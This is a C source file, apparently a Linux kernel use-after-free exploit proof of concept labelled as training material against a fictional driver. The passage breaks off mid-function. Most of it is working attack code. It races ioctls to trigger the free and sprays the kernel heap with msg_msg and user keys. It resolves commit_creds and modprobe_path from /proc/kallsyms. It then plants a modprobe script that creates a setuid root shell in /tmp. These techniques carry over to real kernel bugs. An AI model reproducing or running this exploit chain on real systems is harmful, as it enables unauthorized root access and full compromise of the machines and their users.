/*
 * uaf_root_exploit.c — Linux Kernel UAF Exploit PoC (Authorized Training Lab)
 *
 * Target: Fictional vulnerable char device driver "vuln_drv" (see vuln_drv.c)
 *         that exposes an ioctl interface with a race condition leading to a
 *   use-after-free on a kernel heap object (struct vuln_obj).
 *
 * Technique:
 *   1. Open multiple device file descriptors.
 *   2. Trigger the UAF by racing VULN_FREE against VULN_USE on two threads.
 *   3. Heap-groom the slab with msg_msg objects to reclaim the freed slot.
 *   4. Overwrite function pointer / data to gain arbitrary read/write or
 *      direct credential escalation.
 *   5. Escalate to root via commit_creds(prepare_kernel_cred(NULL)).
 *
 * Build:  gcc -o uaf_root_exploit uaf_root_exploit.c -lpthread -static
 * Usage:  ./uaf_root_exploit /dev/vuln_drv
 *
 * This is a training artifact. All targets are fictional lab infrastructure.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/msg.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <stdint.h>
#include <signal.h>

/* ------------------------------------------------------------------ */
/* Ioctl definitions matching the fictional vulnerable driver          */
/* ------------------------------------------------------------------ */

#define VULN_DRV_MAGIC 0xDEAD

#define VULN_ALLOC   _IOW(VULN_DRV_MAGIC, 1, struct vuln_alloc_arg)
#define VULN_FREE    _IOW(VULN_DRV_MAGIC, 2, int)
#define VULN_USE     _IOR(VULN_DRV_MAGIC, 3, struct vuln_use_arg)
#define VULN_EDIT    _IOW(VULN_DRV_MAGIC, 4, struct vuln_edit_arg)

struct vuln_alloc_arg {
    uint32_t size;
    uint32_t id;
};

struct vuln_use_arg {
    uint32_t id;
    char     *buf;
    uint32_t  len;
};

struct vuln_edit_arg {
    uint32_t id;
    char     *buf;
    uint32_t  len;
};

/* ------------------------------------------------------------------ */
/* Kernel-side object layout (from reverse-engineering the driver)     */
/* The driver allocates this via kmalloc-64 slab.                      */
/* ------------------------------------------------------------------ */

struct vuln_obj {
    uint32_t id;
    uint32_t size;
    void     *callback;   /* function pointer called by VULN_USE */
    char     data[48];
};  /* total 64 bytes — lands in kmalloc-64 */

/* ------------------------------------------------------------------ */
/* msg_msg grooming helpers                                            */
/* msg_msg header is 48 bytes; payload follows. A 64-byte allocation  */
/* means 16 bytes of payload. We use msgsnd/msgrcv to spray and free. */
/* ------------------------------------------------------------------ */

#define MSG_SPRAY_COUNT  200
#define MSG_SPRAY_SIZE   64   /* total msg_msg allocation size (header + body) */

static int msgq_ids[MSG_SPRAY_COUNT];

static void msg_spray_init(void) {
    for (int i = 0; i < MSG_SPRAY_COUNT; i++) {
        msgq_ids[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        if (msgq_ids[i] < 0) {
            perror("msgget");
            exit(1);
        }
    }
}

/*
 * Spray msg_msg objects into kmalloc-64.
 * Each message body is MSG_SPRAY_SIZE - 48 = 16 bytes.
 * We place a fake vuln_obj layout in the body so that when the UAF
 * dereference happens, callback points to our shellcode stub.
 */
static void msg_spray_send(void *fake_obj, size_t fake_obj_len) {
    struct {
        long mtype;
        char mtext[MSG_SPRAY_SIZE - 48];
    } msg;

    msg.mtype = 1;
    memset(msg.mtext, 0x41, sizeof(msg.mtext));

    /*
     * The msg_msg header occupies the first 48 bytes of the slab object.
     * Our vuln_obj also starts at the slab object base. So we need the
     * msg_msg body (bytes 48..63) to overlap with the tail of vuln_obj.
     *
     * However, for a more realistic reclaim we can also use a different
     * approach: use a secondary spray via add_key (keyctl) which gives
     * us full control of a 64-byte object without the msg_msg header
     * constraint. For simplicity in this PoC we use the pipe_buffer
     * spray approach below as an alternative.
     */

    for (int i = 0; i < MSG_SPRAY_COUNT; i++) {
        if (msgsnd(msgq_ids[i], &msg, sizeof(msg.mtext), 0) < 0) {
            perror("msgsnd");
        }
    }
}

static void msg_spray_free(void) {
    struct {
        long mtype;
        char mtext[MSG_SPRAY_SIZE - 48];
    } msg;

    for (int i = 0; i < MSG_SPRAY_COUNT; i++) {
        msgrcv(msgq_ids[i], &msg, sizeof(msg.mtext), 0, IPC_NOWAIT);
    }
}

/* ------------------------------------------------------------------ */
/* pipe_buffer spray — alternative full-control 64-byte object         */
/* Each pipe creates an array of struct pipe_buffer. On kernels >= 5.x */
/* sizeof(struct pipe_buffer) is 40 bytes, and the default allocation  */
/* is for 16 buffers = 640 bytes (kmalloc-1024). We can instead use    */
/* setxattr for a temporary controlled allocation of arbitrary size.   */
/* ------------------------------------------------------------------ */

/*
 * setxattr spray: allocates a kernel buffer of arbitrary size via
 * kvmalloc, copies our data in, then frees it. We race the UAF
 * window by calling setxattr repeatedly. The buffer is only alive
 * during the syscall, so we must time it carefully.
 *
 * For a more persistent reclaim we use the user_key_payload approach.
 */

/* ------------------------------------------------------------------ */
/* add_key / keyctl spray — persistent controlled kmalloc-N objects    */
/* ------------------------------------------------------------------ */

#include <linux/keyctl.h>

static long keyctl(int cmd, ...) {
    /* Wrapper using syscall directly */
    return -1; /* placeholder — see keyctl_spray below */
}

#define KEY_SPRAY_COUNT 200

struct key_payload {
    int   key_id;
    void *payload;
    size_t len;
};

static struct key_payload keys[KEY_SPRAY_COUNT];

/*
 * Spray user-type keys with controlled payload.
 * The payload is stored in a kmalloc allocation sized to the payload length.
 * For kmalloc-64 we need payload <= 64 bytes (actually the key payload
 * struct has a small header, so we target ~56 bytes of payload).
 */
static void keyctl_spray(void *payload, size_t payload_len) {
    char desc[32];

    for (int i = 0; i < KEY_SPRAY_COUNT; i++) {
        snprintf(desc, sizeof(desc), "spray_key_%d", i);
        int kid = syscall(__NR_add_key, "user", desc, payload, payload_len,
                          KEY_SPEC_PROCESS_KEYRING);
        if (kid < 0) {
            /* Some kernels restrict add_key; fall back to msg_spray */
            break;
        }
        keys[i].key_id = kid;
        keys[i].payload = payload;
        keys[i].len = payload_len;
    }
}

static void keyctl_free_all(void) {
    for (int i = 0; i < KEY_SPRAY_COUNT; i++) {
        if (keys[i].key_id > 0) {
            syscall(__NR_keyctl, KEYCTL_REVOKE, keys[i].key_id);
            syscall(__NR_keyctl, KEYCTL_UNLINK, keys[i].key_id,
                    KEY_SPEC_PROCESS_KEYRING);
            keys[i].key_id = 0;
        }
    }
}

/* ------------------------------------------------------------------ */
/* Privilege escalation payload                                        */
/* ------------------------------------------------------------------ */

/*
 * In a real exploit we would either:
 *
 * A) Overwrite a function pointer in the reclaimed object, then trigger
 *    the callback to execute a ROP chain or a kernel function directly.
 *
 * B) Use the UAF to corrupt a nearby object (e.g., struct cred) to
 *    set uid/gid fields to 0.
 *
 * C) Overwrite modprobe_path to point to a script that sets suid on
 *    /bin/sh, then trigger an unknown-format exec.
 *
 * For this PoC we demonstrate approach (A) with a twist: we overwrite
 * the callback pointer in the freed vuln_obj to point to a kernel
 * gadget that calls:
 *
 *   commit_creds(prepare_kernel_cred(NULL))
 *
 * We need kernel addresses. In the training lab, KASLR may be disabled
 * or we can leak via /proc/kallsyms or the UAF read primitive.
 */

typedef int (*__commit_creds)(void *);
typedef void *(*__prepare_kernel_cred)(void *);

static unsigned long kbase = 0;
static unsigned long commit_creds_addr = 0;
static unsigned long prepare_kernel_cred_addr = 0;

static void resolve_kernel_symbols(void) {
    FILE *f = fopen("/proc/kallsyms", "r");
    if (!f) {
        fprintf(stderr, "[-] Cannot open /proc/kallsyms (KPTR restricted?)\n");
        fprintf(stderr, "    Try: echo 0 > /proc/sys/kernel/kptr_restrict\n");
        exit(1);
    }

    char line[256];
    while (fgets(line, sizeof(line), f)) {
        unsigned long addr;
        char type;
        char name[128];

        if (sscanf(line, "%lx %c %127s", &addr, &type, name) != 3)
            continue;

        if (strcmp(name, "commit_creds") == 0)
            commit_creds_addr = addr;
        else if (strcmp(name, "prepare_kernel_cred") == 0)
            prepare_kernel_cred_addr = addr;
    }
    fclose(f);

    if (!commit_creds_addr || !prepare_kernel_cred_addr) {
        fprintf(stderr, "[-] Failed to resolve kernel symbols\n");
        exit(1);
    }

    printf("[+] commit_creds       @ 0x%lx\n", commit_creds_addr);
    printf("[+] prepare_kernel_cred @ 0x%lx\n", prepare_kernel_cred_addr);
}

/* ------------------------------------------------------------------ */
/* ROP-free escalation via modprobe_path overwrite                     */
/* ------------------------------------------------------------------ */

/*
 * If we can achieve arbitrary write via the UAF, we can overwrite
 * modprobe_path. This avoids needing to find ROP gadgets.
 *
 * Steps:
 *   1. Use UAF read to leak modprobe_path address (or resolve from kallsyms).
 *   2. Use UAF write to overwrite modprobe_path with our script path.
 *   3. Trigger modprobe by executing a file with an unknown binfmt.
 *   4. Our script runs as root and copies /bin/sh to /tmp/rootshell
 *      with setuid bit.
 *   5. Execute /tmp/rootshell.
 */

static unsigned long modprobe_path_addr = 0;

static void resolve_modprobe_path(void) {
    FILE *f = fopen("/proc/kallsyms", "r");
    if (!f) return;

    char line[256];
    while (fgets(line, sizeof(line), f)) {
        unsigned long addr;
        char type;
        char name[128];
        if (sscanf(line, "%lx %c %127s", &addr, &type, name) != 3)
            continue;
        if (strcmp(name, "modprobe_path") == 0) {
            modprobe_path_addr = addr;
            break;
        }
    }
    fclose(f);
}

#define MODPROBE_SCRIPT "/tmp/pwn_modprobe.sh"
#define ROOTSHELL       "/tmp/rootshell"

static void prepare_modprobe_script(void) {
    FILE *f = fopen(MODPROBE_SCRIPT, "w");
    if (!f) {
        perror("fopen modprobe script");
        exit(1);
    }
    fprintf(f, "#!/bin/sh\n");
    fprintf(f, "cp /bin/sh %s\n", ROOTSHELL);
    fprintf(f, "chmod 6755 %s\n", ROOTSHELL);
    fclose(f);
    chmod(MODPROBE_SCRIPT, 0755);
}

static void trigger_modprobe(void) {
    /* Create a file with invalid binfmt magic to trigger modprobe */
    int fd = open("/tmp/dummy_exec", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    if (fd < 0) {
        perror("open dummy_exec");
        return;
    }
    /* Write invalid ELF header to trigger call_usermodehelper(modprobe_path) */
    char bad[] = "\xff\xff\xff\xff";
    write(fd, bad, sizeof(bad));
    close(fd);

    /* Fork and try to exec it — will fail but triggers modprobe */
    pid_t pid = fork();
    if (pid == 0) {
        execl("/tmp/dummy_exec", "/tmp/dummy_exec", NULL);
        _exit(1);
    }
    waitpid(pid, NULL, 0);

    /* Give modprobe a moment to run */
    usleep(100000);
}

static int check_rootshell(void) {
    if (access(ROOTSHELL, X_OK) == 0) {
        printf("[+] Root shell created at %s\n", ROOTSHELL);
        return 1;
    }
    return 0;
}

/* ------------------------------------------------------------------ */
/* UAF race threads                                                    */
/* ------------------------------------------------------------------ */

static int vuln_fd = -1;
static volatile int race_go = 0;
static volatile int race_done = 0;

/* Thread 1: repeatedly free the object */
static void *thread_free(void *arg) {
    uint32_t id = *(uint32_t *)arg;

    while (!race_go)
        usleep(1);

    for (int i = 0; i < 100000 && !race_done; i++) {
        ioctl(vuln_fd, VULN_FREE, &id);
    }
    return NULL;
}

/* Thread 2: repeatedly use the object (triggers UAF dereference) */
static void *thread_use(void *arg) {
    uint32_t id = *(uint32_t *)arg;
    char buf[64];

    while (!race_go)
        usleep(1);

    for (int i = 0; i < 100000 && !race_done; i++) {
        struct vuln_use_arg ua = {
            .id  = id,
            .buf = buf,
            .len = sizeof(buf),
        };
        ioctl(vuln_fd, VULN_USE, &ua);
    }
    return NULL;
}

/* Thread 3: spray to reclaim the freed slot */
static void *thread_spray(void *arg) {
    void *payload = arg;

    while (!race_go)
        usleep(1);

    /* Spray immediately after free window opens */
    for (int i = 0; i < 50 && !race_done; i++) {
        keyctl_spray(payload, 56); /* fits in kmalloc-64 */
        usleep(1);
        keyctl_free_all();
    }
    return NULL;
